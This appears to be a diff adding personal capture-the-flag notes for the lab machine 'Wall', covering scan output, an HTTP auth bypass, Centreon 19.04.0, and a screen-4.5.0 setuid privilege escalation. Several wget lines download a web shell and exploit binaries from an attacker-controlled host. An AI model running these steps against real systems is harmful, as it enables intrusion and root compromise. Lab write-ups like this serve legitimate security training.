@@ -1,0 +1,57 @@
+﻿wall : 10.10.10.157 (CVE like)
+
+====>RECON<==== 
+
+===> nmap
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
+|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
+|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+===> gobuster dir -u http://10.10.10.157 -w /usr/share/wordlists/dirb/common.txt -e
+
+http://10.10.10.157/.hta (Status: 403)
+http://10.10.10.157/.htaccess (Status: 403)
+http://10.10.10.157/.htpasswd (Status: 403)
+http://10.10.10.157/index.html (Status: 200)
+http://10.10.10.157/monitoring (Status: 401)
+http://10.10.10.157/server-status (Status: 403)
+
+===> 10.10.10.157/monitoring http auh bypass
+intercept and change request to POST
+
+===> 10.10.10.157/centreon
+© Centreon 2005 - 2019
+v. 19.04.0 
+
+[upload shell]
+wget http://10.10.14.230:8000/shell.php
+
+got a shell
+
+==========
+run lse.sh
+==========
+[!] fst020 Uncommon setuid binaries.................. yes!
+
+/bin/screen-4.5.0
+
+Use manually!: https://www.exploit-db.com/exploits/41154
+
+wget -O libhax.so http://10.10.14.230:8000/exploits/libhax.so
+
+wget -O rootshell http://10.10.14.230:8000/exploits/rootshell
+
+GOT ROOT AND USER!
+
+
+
+
+
